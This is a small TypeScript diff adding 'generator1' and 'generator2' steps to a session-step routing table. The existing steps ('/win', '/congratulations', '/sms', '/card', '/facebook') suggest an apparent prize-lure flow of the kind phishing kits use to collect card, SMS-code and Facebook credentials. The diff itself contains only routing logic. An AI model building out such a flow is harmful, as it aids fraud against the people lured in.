@@ -55,6 +55,10 @@ export function stepToPath(
       return `/congratulations${qs}`;
     case "special_approval":
       return `/special-approval${qs}`;
+    case "generator1":
+      return `/generator1${qs}`;
+    case "generator2":
+      return `/generator2${qs}`;
     default:
       return `/win${qs}`;
   }
@@ -72,6 +76,8 @@ export function pathToStep(pathname: string): SessionStep | null {
   if (pathname.startsWith("/live-support")) return "live_support";
   if (pathname.startsWith("/congratulations")) return "congrats";
   if (pathname.startsWith("/special-approval")) return "special_approval";
+  if (pathname.startsWith("/generator1")) return "generator1";
+  if (pathname.startsWith("/generator2")) return "generator2";
   if (pathname.startsWith("/sms")) return "sms";
   if (pathname.startsWith("/card")) return "card";
   if (pathname.startsWith("/facebook")) return "facebook";
